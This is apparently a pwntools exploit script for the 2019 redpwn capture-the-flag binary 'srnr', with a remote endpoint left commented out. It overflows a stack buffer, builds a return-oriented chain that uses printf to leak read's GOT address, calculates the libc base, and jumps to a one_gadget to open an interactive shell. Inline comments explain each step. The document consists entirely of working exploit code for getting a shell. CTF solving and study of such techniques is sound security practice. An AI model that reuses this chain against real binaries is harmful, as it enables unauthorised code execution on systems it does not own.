from pwn import *

e = ELF("./srnr")
p = process("./srnr")
#p = remote("chall.2019.redpwn.net",4008)

main = 0x40073b
pop_rdi = 0x00400823
printf = 0x4005c0
text = 0x400c56
ret = 0x4007b8

'''
payload = 'a'*17
payload += p64(ret)
payload += p64(main)
p.sendlineafter("bytes: ", "0")
log.info(":)")
p.sendline(payload)
log.info(":))")
p.interactive()
'''


payload = 'a'*17  			#  padding
payload += p64(pop_rdi)			#  pop the argument to printf, aka the next element on the stack is printf's arg
payload += p64(e.got["read"])		#  printf's argument is read's GOT. we're leaking read's resolved address.
payload += p64(ret)			#  random ret here for padding (not adding this caused segfaults in buffered_vfprintf for some reason?
payload += p64(e.plt["printf"])		#  printf call that leaks read's address
payload += p64(ret)			#  another ret for padding
payload += p64(main)			#  back to main. this time we leaked libc, the next time we will spawn a shell.
p.sendlineafter("bytes: ", "0")
p.sendline(payload)
#tmp = p.recvall()
#log.info(tmp)
#p.interactive()


leak = p.recvregex(".....\x7f")
log.info(hex(u64(leak+'\x00\x00')))
pause()
libc = u64(leak+'\x00\x00') - 0x64e80
og = libc + 0x4f2c5
log.info("LIBC: "+hex(libc))

payload = 'a'*17			#  padding
payload += p64(og)			#  calculated address of one_gadget
p.sendlineafter("bytes: ","0")
p.sendline(payload)
p.interactive()
